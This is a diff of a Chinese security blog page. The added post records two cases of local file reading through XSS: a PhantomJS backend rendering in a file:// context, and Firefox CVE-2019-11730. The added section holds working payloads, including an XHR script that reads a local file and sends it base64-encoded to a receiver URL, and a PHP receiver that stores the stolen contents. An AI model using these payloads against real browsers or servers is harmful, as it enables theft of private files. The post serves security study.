@@ -2,7 +2,7 @@
 <html class="has-navbar-fixed-top">
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-<title>了解HPP - Threezh1&#39;s blog</title>
+<title>XSS + XHR 两个案例的记录 - Threezh1&#39;s blog</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
 <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
@@ -18,20 +18,20 @@
 
 
 
-    <meta name="description" content="HPP&amp;#x6D4B;&amp;#x8BD5;&amp;#xFF1A;&amp;#x5B58;&amp;#x5728;&amp;#x4E8E;POST,GET&amp;#x4E4B;&amp;#x4E2D;&amp;#x3002; &amp;#x6B65;&amp;#x9AA4;&amp;#xFF1A;  page?par1=vall page?par1=HPP_TEST1 page?par1=val1&amp;amp;par1=HPP_TEST1">
-<meta name="keywords" content="HPP">
+    <meta name="description" content="&amp;#x8BB0;&amp;#x5F55;&amp;#x4E00;&amp;#x4E0B;&amp;#x6700;&amp;#x8FD1;&amp;#x770B;&amp;#x5230;&amp;#x7684;&amp;#x4E24;&amp;#x4E2A;&amp;#x6BD4;&amp;#x8F83;&amp;#x6709;&amp;#x8DA3;&amp;#x7684;&amp;#x6848;&amp;#x4F8B;&amp;#x3002; &amp;#x6848;&amp;#x4F8B;&amp;#x6848;&amp;#x4F8B;&amp;#x4E00;&amp;#x300">
+<meta name="keywords" content="XSS,XHR">
 <meta property="og:type" content="article">
-<meta property="og:title" content="了解HPP">
-<meta property="og:url" content="http://yoursite.com/2019/01/01/HPP_Subdomain_takeover/index.html">
+<meta property="og:title" content="XSS + XHR 两个案例的记录">
+<meta property="og:url" content="http://yoursite.com/2020/04/04/XSS_XHR_LFI/index.html">
 <meta property="og:site_name" content="Threezh1&#39;s blog">
-<meta property="og:description" content="HPP&amp;#x6D4B;&amp;#x8BD5;&amp;#xFF1A;&amp;#x5B58;&amp;#x5728;&amp;#x4E8E;POST,GET&amp;#x4E4B;&amp;#x4E2D;&amp;#x3002; &amp;#x6B65;&amp;#x9AA4;&amp;#xFF1A;  page?par1=vall page?par1=HPP_TEST1 page?par1=val1&amp;amp;par1=HPP_TEST1">
+<meta property="og:description" content="&amp;#x8BB0;&amp;#x5F55;&amp;#x4E00;&amp;#x4E0B;&amp;#x6700;&amp;#x8FD1;&amp;#x770B;&amp;#x5230;&amp;#x7684;&amp;#x4E24;&amp;#x4E2A;&amp;#x6BD4;&amp;#x8F83;&amp;#x6709;&amp;#x8DA3;&amp;#x7684;&amp;#x6848;&amp;#x4F8B;&amp;#x3002; &amp;#x6848;&amp;#x4F8B;&amp;#x6848;&amp;#x4F8B;&amp;#x4E00;&amp;#x300">
 <meta property="og:locale" content="Chinese">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c982a7096f07.jpg">
-<meta property="og:updated_time" content="2020-02-12T14:04:18.940Z">
+<meta property="og:image" content="https://bbs.d0g3.cn/assets/files/2020-04-03/1585900956-669534-tim20200403160212.png">
+<meta property="og:updated_time" content="2020-04-04T04:04:10.485Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="了解HPP">
-<meta name="twitter:description" content="HPP&amp;#x6D4B;&amp;#x8BD5;&amp;#xFF1A;&amp;#x5B58;&amp;#x5728;&amp;#x4E8E;POST,GET&amp;#x4E4B;&amp;#x4E2D;&amp;#x3002; &amp;#x6B65;&amp;#x9AA4;&amp;#xFF1A;  page?par1=vall page?par1=HPP_TEST1 page?par1=val1&amp;amp;par1=HPP_TEST1">
-<meta name="twitter:image" content="https://i.loli.net/2019/03/25/5c982a7096f07.jpg">
+<meta name="twitter:title" content="XSS + XHR 两个案例的记录">
+<meta name="twitter:description" content="&amp;#x8BB0;&amp;#x5F55;&amp;#x4E00;&amp;#x4E0B;&amp;#x6700;&amp;#x8FD1;&amp;#x770B;&amp;#x5230;&amp;#x7684;&amp;#x4E24;&amp;#x4E2A;&amp;#x6BD4;&amp;#x8F83;&amp;#x6709;&amp;#x8DA3;&amp;#x7684;&amp;#x6848;&amp;#x4F8B;&amp;#x3002; &amp;#x6848;&amp;#x4F8B;&amp;#x6848;&amp;#x4F8B;&amp;#x4E00;&amp;#x300">
+<meta name="twitter:image" content="https://bbs.d0g3.cn/assets/files/2020-04-03/1585900956-669534-tim20200403160212.png">
 
 
 
@@ -116,25 +116,21 @@
                     
                     
                     
-                    <a class="navbar-item" href="#HPP">1&nbsp;&nbsp;<b>HPP</b></a>
+                    <a class="navbar-item" href="#案例">1&nbsp;&nbsp;<b>案例</b></a>
                     
                     
                     
-                    <a class="navbar-item" href="#测试：">1.1&nbsp;&nbsp;测试：</a>
+                    <a class="navbar-item" href="#案例一、后端-PhantomJS-导致的文件读取">1.1&nbsp;&nbsp;案例一、后端 PhantomJS 导致的文件读取</a>
                     
                     
                     
-                    <a class="navbar-item" href="#Referer">1.2&nbsp;&nbsp;Referer:</a>
+                    <a class="navbar-item" href="#案例二、CVE-2019-11730-导致的文件读取">1.2&nbsp;&nbsp;案例二、CVE-2019-11730 导致的文件读取</a>
                     
                     
                     <hr class="navbar-divider">
                     
                     
-                    <a class="navbar-item" href="#Subdomain-takeover">2&nbsp;&nbsp;<b>Subdomain_takeover</b></a>
-                    
-                    
-                    
-                    <a class="navbar-item" href="#测试">2.1&nbsp;&nbsp;测试</a>
+                    <a class="navbar-item" href="#利用">2&nbsp;&nbsp;<b>利用</b></a>
                     
                 </div>
             </div>
@@ -156,12 +152,12 @@
     <article class="article content gallery" itemscope itemprop="blogPost">
     <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
         
-            了解HPP
+            XSS + XHR 两个案例的记录
         
     </h1>
     <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
         <span class="column is-narrow">
-            <time datetime="2019-01-01T04:00:00.000Z" itemprop="datePublished">Jan 1 2019</time>
+            <time datetime="2020-04-04T04:03:33.000Z" itemprop="datePublished">Apr 4 2020</time>
         </span>
         
         <span class="column is-narrow article-category">
@@ -173,62 +169,61 @@
         <span class="column is-narrow">
             
             
-            2 minutes lesen (Über 250 Wörter)
+            2 minutes lesen (Über 340 Wörter)
         </span>
         
     </div>
     <div class="article-entry is-size-6-mobile" itemprop="articleBody">
     
-        <h1 id="HPP"><a href="#HPP" class="headerlink" title="HPP"></a>HPP</h1><h2 id="&#x6D4B;&#x8BD5;&#xFF1A;"><a href="#&#x6D4B;&#x8BD5;&#xFF1A;" class="headerlink" title="&#x6D4B;&#x8BD5;&#xFF1A;"></a>&#x6D4B;&#x8BD5;&#xFF1A;</h2><p>&#x5B58;&#x5728;&#x4E8E;POST,GET&#x4E4B;&#x4E2D;&#x3002;</p>
-<p>&#x6B65;&#x9AA4;&#xFF1A;</p>
+        <p><img src="https://bbs.d0g3.cn/assets/files/2020-04-03/1585900956-669534-tim20200403160212.png" alt="images"></p>
+<p>&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;&#x6700;&#x8FD1;&#x770B;&#x5230;&#x7684;&#x4E24;&#x4E2A;&#x6BD4;&#x8F83;&#x6709;&#x8DA3;&#x7684;&#x6848;&#x4F8B;&#x3002;</p>
+<h2 id="&#x6848;&#x4F8B;"><a href="#&#x6848;&#x4F8B;" class="headerlink" title="&#x6848;&#x4F8B;"></a>&#x6848;&#x4F8B;</h2><h3 id="&#x6848;&#x4F8B;&#x4E00;&#x3001;&#x540E;&#x7AEF;-PhantomJS-&#x5BFC;&#x81F4;&#x7684;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;"><a href="#&#x6848;&#x4F8B;&#x4E00;&#x3001;&#x540E;&#x7AEF;-PhantomJS-&#x5BFC;&#x81F4;&#x7684;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;" class="headerlink" title="&#x6848;&#x4F8B;&#x4E00;&#x3001;&#x540E;&#x7AEF; PhantomJS &#x5BFC;&#x81F4;&#x7684;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;"></a>&#x6848;&#x4F8B;&#x4E00;&#x3001;&#x540E;&#x7AEF; PhantomJS &#x5BFC;&#x81F4;&#x7684;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;</h3><p>&#x53C2;&#x8003;&#xFF1A; <a href="https://xz.aliyun.com/t/127" target="_blank" rel="noopener">https://xz.aliyun.com/t/127</a></p>
+<p>&#x5229;&#x7528;&#x8FC7;&#x7A0B;&#xFF1A;</p>
 <ol>
-<li>page?par1=vall</li>
-<li>page?par1=HPP_TEST1</li>
-<li>page?par1=val1&amp;par1=HPP_TEST1<a id="more"></a>
-<img src="https://i.loli.net/2019/03/25/5c982a7096f07.jpg" alt="&#x56FE;&#x7247;"></li>
+<li>&#x540E;&#x7AEF;&#x4F7F;&#x7528;PhantomJS&#x6765;&#x751F;&#x6210;&#x9875;&#x9762;&#xFF0C;&#x751F;&#x6210;&#x597D;&#x4E86;&#x4F1A;&#x622A;&#x56FE;&#x3002;(&#x4E0A;&#x4E0B;&#x6587;&#x4E3A;file://)</li>
+<li>&#x4E1A;&#x52A1;&#x5B58;&#x5728;&#x4E00;&#x4E2A;xss</li>
+<li>&#x901A;&#x8FC7;XHR&#x8BFB;&#x53D6;&#x672C;&#x5730;&#x6587;&#x4EF6;</li>
 </ol>
-<p>&#x66F4;&#x8BE6;&#x7EC6;&#x7684;&#xFF1A;<a href="https://www.acunetix.com/blog/whitepaper-http-parameter-pollution/" target="_blank" rel="noopener">https://www.acunetix.com/blog/whitepaper-http-parameter-pollution/</a></p>
-<p>Use to:</p>
-<ol>
-<li>&#x53D6;&#x4EE3;&#x73B0;&#x6709;&#x7684;&#x7F16;&#x7801;HTTP&#x53C2;&#x6570;&#x3002;</li>
-<li>&#x66F4;&#x6539;&#x6216;&#x4FEE;&#x6539;&#x9884;&#x671F;/&#x6B63;&#x5E38;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x884C;&#x4E3A;&#x3002;</li>
-<li>&#x8BBF;&#x95EE;&#x5E76;&#x5229;&#x7528;&#x672A;&#x6B63;&#x786E;&#x63A7;&#x5236;&#x7684;&#x53D8;&#x91CF;&#x3002;</li>
-<li>&#x7ED5;&#x8FC7;WAF&#x89C4;&#x5219;&#x6216;&#x8F93;&#x5165;&#x9A8C;&#x8BC1;&#x673A;&#x5236;&#x3002;</li>
-</ol>
-<h2 id="Referer"><a href="#Referer" class="headerlink" title="Referer:"></a>Referer:</h2><ul>
-<li><a href="https://medium.com/@logicbomb_1/bugbounty-compromising-user-account-how-i-was-able-to-compromise-user-account-via-http-4288068b901f" target="_blank" rel="noopener">#BugBounty&#x200A;&#x2014;&#x200A;Compromising User Account- &#x201D;How I was able to compromise user account via HTTP Parameter Pollution(HPP)&#x201D;</a></li>
-<li><a href="https://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf" target="_blank" rel="noopener">HTTP Parameter Pollution</a></li>
-</ul>
-<h1 id="Subdomain-takeover"><a href="#Subdomain-takeover" class="headerlink" title="Subdomain_takeover"></a>Subdomain_takeover</h1><h2 id="&#x6D4B;&#x8BD5;"><a href="#&#x6D4B;&#x8BD5;" class="headerlink" title="&#x6D4B;&#x8BD5;"></a>&#x6D4B;&#x8BD5;</h2><p>&#x4F7F;&#x7528;&#xFF1A;dig nslookup host&#x6765;&#x63A2;&#x6D4B;&#x5B50;&#x57DF;&#x540D;&#x89E3;&#x6790;&#x7684;&#x5730;&#x5740;</p>
-<p>&#x5BF9;&#x6BD4;&#xFF1A;</p>
+<h3 id="&#x6848;&#x4F8B;&#x4E8C;&#x3001;CVE-2019-11730-&#x5BFC;&#x81F4;&#x7684;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;"><a href="#&#x6848;&#x4F8B;&#x4E8C;&#x3001;CVE-2019-11730-&#x5BFC;&#x81F4;&#x7684;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;" class="headerlink" title="&#x6848;&#x4F8B;&#x4E8C;&#x3001;CVE-2019-11730 &#x5BFC;&#x81F4;&#x7684;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;"></a>&#x6848;&#x4F8B;&#x4E8C;&#x3001;CVE-2019-11730 &#x5BFC;&#x81F4;&#x7684;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;</h3><p>&#x53C2;&#x8003;&#xFF1A;<a href="https://hpdoger.cn/2020/03/17/title:%20CVE-2019-11730%20%E5%88%86%E6%9E%90&amp;%E5%B0%8F%E8%B0%88/" target="_blank" rel="noopener">CVE-2019-11730 &#x5206;&#x6790;&amp;&#x5C0F;&#x8C08;</a></p>
+<p>&#x5F53;&#x7528;&#x6237;&#x628A;&#x5E26;&#x6709;payload&#x7684;&#x9875;&#x9762;&#x4FDD;&#x5B58;&#x5230;&#x672C;&#x5730;&#x5E76;&#x7528;&#x6F0F;&#x6D1E;&#x5BF9;&#x4E8E;&#x7684;firefox&#x6253;&#x5F00;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8BFB;&#x53D6;&#x672C;&#x5730;&#x7684;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x3002;</p>
 <ul>
-<li><p><a href="https://github.com/EdOverflow/can-i-take-over-xyz" target="_blank" rel="noopener">https://github.com/EdOverflow/can-i-take-over-xyz</a></p>
-</li>
-<li><p><a href="https://dzone.com/articles/what-are-subdomain-takeovers-how-to-test-and-avoid" target="_blank" rel="noopener">https://dzone.com/articles/what-are-subdomain-takeovers-how-to-test-and-avoid</a></p>
+<li>&#x6F0F;&#x6D1E;&#x5BF9;&#x5E94;&#x7684;firefox&#x7248;&#x672C;&#xFF1A;<a href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-11730" target="_blank" rel="noopener">https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-11730</a></li>
+<li>&#x4E0B;&#x8F7D;&#x6307;&#x5B9A;&#x7248;&#x672C;&#x7684;firefox&#xFF1A;<a href="http://ftp.mozilla.org/pub/firefox/releases/" target="_blank" rel="noopener">http://ftp.mozilla.org/pub/firefox/releases/</a><a id="more"></a>
 </li>
 </ul>
-<p>&#x6765;&#x5224;&#x65AD;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x6258;&#x7BA1;&#x3002;</p>
-<p>&#x53EA;&#x80FD;&#x5148;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4E86;&#x89E3;&#xFF0C;&#x5229;&#x7528;&#x53EA;&#x80FD;&#x7B49;&#x540E;&#x9762;&#x9047;&#x5230;&#x518D;&#x8BD5;&#x4E86;&#x3002;</p>
+<h2 id="&#x5229;&#x7528;"><a href="#&#x5229;&#x7528;" class="headerlink" title="&#x5229;&#x7528;"></a>&#x5229;&#x7528;</h2><p>&#x83B7;&#x53D6;&#x4E0A;&#x4E0B;&#x6587;&#x73AF;&#x5883;&#xFF1A;</p>
+<figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>/<span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;document.write(window.location)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x6848;&#x4F8B;&#x4E00;&#x4E2D;&#xFF0C;&#x672C;&#x8EAB;&#x662F;&#x540C;&#x6E90;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;iframe&#x76F4;&#x63A5;&#x8BFB;&#x53D6;&#x672C;&#x5730;&#x6587;&#x4EF6;</p>
+<figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">file:///C:/Users/ThreeZhi/Desktop/test.txt</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x7B80;&#x5355;&#x8BFB;&#x53D6;&#x6587;&#x4EF6;&#xFF1A;</p>
+<figure class="highlight html hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="hljs-undefined"></span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reqListener</span> (<span class="hljs-params"></span>) </span>{</span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">var</span> b64 = btoa(<span class="hljs-keyword">this</span>.responseText);</span></span><br><span class="line"><span class="hljs-javascript">        <span class="hljs-keyword">var</span> request = <span class="hljs-keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="hljs-javascript">        request.open(<span class="hljs-string">&apos;GET&apos;</span>, <span class="hljs-string">&apos;http://127.0.0.1/getfile.php?file=&apos;</span>+b64, <span class="hljs-literal">true</span>);</span></span><br><span class="line"><span class="hljs-undefined">        request.send();</span></span><br><span class="line"><span class="hljs-undefined">    } </span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-keyword">var</span> oReq = <span class="hljs-keyword">new</span> XMLHttpRequest(); </span></span><br><span class="line"><span class="hljs-javascript">    oReq.addEventListener(<span class="hljs-string">&quot;load&quot;</span>, reqListener); </span></span><br><span class="line"><span class="hljs-javascript">    oReq.open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;file:///C:/Users/ThreeZhi/Desktop/test.txt&quot;</span>); </span></span><br><span class="line"><span class="hljs-undefined">    oReq.send();</span></span><br><span class="line"><span class="hljs-undefined"> </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x63A5;&#x6536;&#x6587;&#x4EF6; (&#x8981;&#x8BBE;&#x7F6E;CORS&#x5934;)</p>
+<figure class="highlight php hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">    header(<span class="hljs-string">&quot;Access-Control-Allow-Origin: *&quot;</span>);</span><br><span class="line">    $file = $_GET[<span class="hljs-string">&apos;file&apos;</span>];</span><br><span class="line">    $fp = fopen(<span class="hljs-string">&apos;file.txt&apos;</span>, <span class="hljs-string">&apos;a+&apos;</span>);</span><br><span class="line">    fwrite($fp, $file.<span class="hljs-string">&quot;\r\n\r\n&quot;</span>);</span><br><span class="line">    fclose($fp);</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x6BD4;&#x8F83;&#x5B8C;&#x5584;&#x7684;payload&#xFF1A;<a href="https://github.com/alidnf/CVE-2019-11730/blob/master/poc.html" target="_blank" rel="noopener">https://github.com/alidnf/CVE-2019-11730/blob/master/poc.html</a></p>
 
     
     </div>
     
     <div class="columns is-variable is-1 is-multiline is-mobile">
     
-        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/HPP/">#HPP</a></span>
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/XSS/">#XSS</a></span>
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/XHR/">#XHR</a></span>
     
     </div>
     
     
     <div class="columns is-mobile is-multiline article-nav">
-        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
-            
-            <a href="/2019/01/01/Head First Javascript/">Head First Javascript笔记</a>
+        <span class="column is-12-mobile is-half-desktop is-hidden-mobile article-nav-prev">
             
         </span>
         <span class="column is-12-mobile is-half-desktop  article-nav-next">
             
-            <a href="/2019/01/01/Open_Redirect/">学习 Open redirect</a>
+            <a href="/2020/02/25/XSS_postMessage_localstorage_xss/">跨窗口通信 &amp; localstorage =&gt; XSS</a>
             
         </span>
     </div>
